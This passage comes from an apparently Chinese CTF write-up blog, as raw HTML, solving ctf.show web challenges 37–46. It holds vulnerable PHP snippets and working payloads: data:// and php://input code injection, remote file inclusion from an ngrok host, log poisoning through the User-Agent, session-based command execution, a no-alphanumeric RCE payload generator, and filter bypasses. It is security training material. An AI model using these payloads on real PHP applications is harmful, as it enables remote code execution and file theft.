class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</span><br></pre></td></tr></table></figure><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span><br><span class="line">?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span><br><span class="line">?c=php://input POST:&lt;?php system(&#x27;nl flag.php&#x27;)?&gt;</span><br><span class="line">?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt</span><br></pre></td></tr></table></figure><h2 id="配合ua实现日志包含"><a href="#配合ua实现日志包含" class="headerlink" title="配合ua实现日志包含"></a>配合ua实现日志包含</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011446405.png" alt="image-20220401144659304"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011447289.png" alt="image-20220401144706214"></p><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span><br><span class="line">?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt</span><br><span class="line">?c=/var/log/nginx/access.log User-Agent: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 06:13:21</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-04 06:03:36</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里过滤的是中文的括号,这里的基本命令可用,但是引号和美元符号都没了</p><p><strong>法一</strong></p><h2 id="利用session执行命令"><a href="#利用session执行命令" class="headerlink" title="利用session执行命令"></a>利用session执行命令</h2><p>利用session_id(),首先修改cookie中PHPSESSID内容为ls</p><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=session_start();system(session_id());</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011627518.png" alt="image-20220401162725395"></p><p>在将c改成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=session_start();highlight_file(session_id());</span><br></pre></td></tr></table></figure><p>修改PHPSESSID的值为flag.php就出问题了。经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p><p><strong>法二</strong></p><h2 id="读文件夹数组改造查看文件"><a href="#读文件夹数组改造查看文件" class="headerlink" title="读文件夹数组改造查看文件"></a>读文件夹数组改造查看文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line"></span><br><span class="line">localeconv():返回一包含本地数字及货币格式信息的数组.其中数组中的第一个为点号(.)</span><br><span class="line">pos():返回数组中的当前元素的值</span><br><span class="line">array_reverse():数组逆序</span><br><span class="line">scandir():获取当前目录下的文件</span><br><span class="line">next():函数将内部指针指向数组中的下一个元素并输出</span><br></pre></td></tr></table></figure><p>首先通过pos(localeconv())得到点号,因为scandir(‘.’)表示得到当前目录下的文件,所以scandir(pos(localeconv()))就能得到flag.php了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><h2 id="无数字字母异或rce"><a href="#无数字字母异或rce" class="headerlink" title="无数字字母异或rce"></a>无数字字母异或rce</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: 羽</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:31:22</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 22:40:07</span></span><br><span class="line"><span class="comment">  email: 1341963450<span class="doctag">@qq</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctf.show</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>先使用php脚本生成or_rce字典</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011757187.png" alt="image-20220401175726105"></p><p>使用python脚本生成payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758828.png" alt="image-20220401175800747"></p><p>分号去一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758209.png" alt="image-20220401175832151"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800030.png" alt="image-20220401180013972"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800342.png" alt="image-20220401180019278"></p><h2 id="其他无参命令执行方法"><a href="#其他无参命令执行方法" class="headerlink" title="其他无参命令执行方法"></a><a href="https://blog.csdn.net/miuzzx/article/details/109143413">其他无参命令执行方法</a></h2><h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><h2 id="linux命令截断"><a href="#linux命令截断" class="headerlink" title="linux命令截断"></a>linux命令截断</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>&#x2F;dev&#x2F;null 2&gt;&amp;1,让所有的输出流(包括正确的和错误的)都定向到空设备丢弃.所以后面的不能执行,要把后面截断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls;%0a</span><br><span class="line">?c=ls;&amp;不行编码试试%26</span><br><span class="line">?c=ls||</span><br></pre></td></tr></table></figure><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 21:32:51</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls%0a</span><br><span class="line">?c=ls%0a&amp;&amp;</span><br><span class="line">?c=ls%0a||</span><br><span class="line">?c=nl flag.php%0a</span><br></pre></td></tr></table></figure><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 21:32:01</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls%0a</span><br><span class="line">?c=ls%0a&amp;&amp;</span><br><span class="line">?c=ls%0a||</span><br><span class="line">?c=nl fla*%0a</span><br></pre></td></tr></table></figure><h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 21:35:34</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl%09fl*%0aphp下%09代替空格</span><br><span class="line">?c=echo$IFS`tac$IFS*`%0A $IFS代表shell里面的空格</span><br></pre></td></tr></table></figure><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><h2 id="反斜杠绕过关键词过滤"><a href="#反斜杠绕过关键词过滤" class="headerlink" title="反斜杠绕过关键词过滤"></a>反斜杠绕过关键词过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-05 21:50:19</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl%09fla\g.php%0a</span><br><span 